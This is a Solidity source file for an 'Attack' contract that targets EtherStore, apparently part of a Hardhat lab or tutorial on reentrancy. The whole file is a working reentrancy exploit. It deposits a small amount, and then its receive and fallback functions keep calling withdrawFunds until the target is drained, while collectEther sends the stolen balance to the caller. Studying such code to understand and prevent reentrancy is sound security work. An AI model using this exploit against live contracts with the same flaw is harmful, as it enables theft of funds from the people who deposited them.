// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./EtherStore.sol";
import "hardhat/console.sol";


contract Attack {
    event received(address _from, uint256 _value);

    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public payable {
        require(msg.value >= 0.01 ether);
        etherStore.depositFunds{value: 0.01 ether}();
        etherStore.withdrawFunds(0.01 ether);
    }

    function collectEther() public payable {
        address payable owner = payable(msg.sender);
        owner.transfer(address(this).balance);
    }

    fallback() external {
        console.log("received ether");
        if (address(etherStore).balance > 0.01 ether) {
            console.log("let's receive more!!");
            etherStore.withdrawFunds(0.01 ether);
        }
    }

    receive() external payable {
        console.log("received ether");
        emit received(msg.sender, msg.value);
        if (address(etherStore).balance > 0.01 ether) {
            console.log("let's receive more!!");
            etherStore.withdrawFunds(0.01 ether);
        }
    }
}
